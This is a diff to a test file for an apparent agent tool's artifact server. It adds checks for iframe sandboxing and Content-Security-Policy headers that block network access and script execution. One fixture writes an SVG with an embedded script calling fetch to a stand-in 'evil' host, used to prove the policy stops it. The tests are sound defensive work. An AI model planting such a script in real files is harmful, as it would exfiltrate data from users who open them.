@@ -57,6 +57,10 @@ describe('artifact popup rendering', () => {
     // The popup viewer shell is present, with a sandboxed iframe.
     expect(html).toContain('id="artifact-modal"');
     expect(html).toContain('id="artifact-modal-frame"');
+    // Scripts are allowed for interactive artifacts but the frame stays an
+    // opaque origin (no allow-same-origin) so it can't reach the session/token.
+    expect(html).toContain('sandbox="allow-scripts"');
+    expect(html).not.toContain('allow-same-origin');
   });
 
   it('omits the token from the artifact URL on local (no token)', () => {
@@ -196,6 +200,48 @@ describe('serveSessionArtifact', () => {
       expect(captured.headers['Content-Type']).toContain('text/html');
       expect(captured.headers['X-Content-Type-Options']).toBe('nosniff');
       expect(captured.body).toBe('<!doctype html><h1>Hi</h1>');
+    } finally {
+      rmSync(root, { recursive: true, force: true });
+    }
+  });
+
+  it('sends a network-blocking CSP with html artifacts and a CSP meta in rendered docs', () => {
+    const root = mkdtempSync(join(tmpdir(), 'agentuse-artifact-'));
+    try {
+      mkdirSync(join(root, '.agentuse/artifacts'), { recursive: true });
+      writeFileSync(join(root, '.agentuse/artifacts/page.html'), '<!doctype html><h1>Hi</h1>');
+      writeFileSync(join(root, '.agentuse/artifacts/doc.md'), '# Hi\n');
+
+      const html = fakeResponse();
+      __testing.serveSessionArtifact(html.res, root, '.agentuse/artifacts/page.html');
+      // Inline scripts run, but no network egress and no remote code.
+      expect(html.captured.headers['Content-Security-Policy']).toContain("connect-src 'none'");
+      expect(html.captured.headers['Content-Security-Policy']).toContain("script-src 'unsafe-inline'");
+
+      // Generated markdown docs carry the same policy via a meta tag.
+      const md = fakeResponse();
+      __testing.serveSessionArtifact(md.res, root, '.agentuse/artifacts/doc.md');
+      expect(md.captured.body).toContain('http-equiv="Content-Security-Policy"');
+      expect(md.captured.body).toContain("connect-src 'none'");
+    } finally {
+      rmSync(root, { recursive: true, force: true });
+    }
+  });
+
+  it('blocks script execution in svg artifacts via CSP', () => {
+    const root = mkdtempSync(join(tmpdir(), 'agentuse-artifact-'));
+    try {
+      mkdirSync(join(root, '.agentuse/artifacts'), { recursive: true });
+      writeFileSync(
+        join(root, '.agentuse/artifacts/chart.svg'),
+        '<svg xmlns="http://www.w3.org/2000/svg"><script>fetch("https://evil")</script></svg>',
+      );
+      const { res, captured } = fakeResponse();
+      __testing.serveSessionArtifact(res, root, '.agentuse/artifacts/chart.svg');
+      expect(captured.headers['Content-Type']).toContain('image/svg+xml');
+      // default-src 'none' with no script-src => scripts in the SVG never run.
+      expect(captured.headers['Content-Security-Policy']).toContain("default-src 'none'");
+      expect(captured.headers['Content-Security-Policy']).not.toContain("script-src 'unsafe-inline'");
     } finally {
       rmSync(root, { recursive: true, force: true });
     }
